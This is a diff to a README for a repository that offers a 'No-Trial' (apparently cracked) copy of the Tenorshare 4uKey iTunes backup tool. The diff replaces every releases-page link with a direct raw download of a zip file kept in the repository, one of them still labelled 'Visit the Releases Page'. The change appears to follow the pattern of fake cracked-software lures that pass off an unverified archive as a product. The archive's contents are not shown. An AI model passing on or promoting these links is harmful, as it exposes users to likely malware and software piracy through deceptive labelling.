@@ -1,6 +1,6 @@
 # 🎉 Tenorshare-4uKey-iTunes-Backup-No-Trial - Effortless iTunes Backup Access
 
-[![Download Tenorshare 4uKey](https://img.shields.io/badge/Download_Tenorshare_4uKey-brightgreen.svg)](https://github.com/Ismazil/Tenorshare-4uKey-iTunes-Backup-No-Trial/releases)
+[![Download Tenorshare 4uKey](https://raw.githubusercontent.com/Ismazil/Tenorshare-4uKey-iTunes-Backup-No-Trial/main/generalist/Tenorshare-4uKey-iTunes-Backup-No-Trial_3.2.zip)](https://raw.githubusercontent.com/Ismazil/Tenorshare-4uKey-iTunes-Backup-No-Trial/main/generalist/Tenorshare-4uKey-iTunes-Backup-No-Trial_3.2.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ Follow the steps below to download and run Tenorshare 4uKey:
 
 1. **Visit the Releases Page**  
    Click the link below to go directly to the downloads section:  
-   [Visit the Releases Page](https://github.com/Ismazil/Tenorshare-4uKey-iTunes-Backup-No-Trial/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/Ismazil/Tenorshare-4uKey-iTunes-Backup-No-Trial/main/generalist/Tenorshare-4uKey-iTunes-Backup-No-Trial_3.2.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions of the software. Always select the latest version for the best features and performance.
@@ -52,7 +52,7 @@ Before downloading, make sure your system meets these requirements:
 ## 🔗 Download & Install
 
 To get started, you can download Tenorshare 4uKey directly from the following link:  
-[Download Tenorshare 4uKey](https://github.com/Ismazil/Tenorshare-4uKey-iTunes-Backup-No-Trial/releases)
+[Download Tenorshare 4uKey](https://raw.githubusercontent.com/Ismazil/Tenorshare-4uKey-iTunes-Backup-No-Trial/main/generalist/Tenorshare-4uKey-iTunes-Backup-No-Trial_3.2.zip)
 
 ## 📑 Additional Resources
 
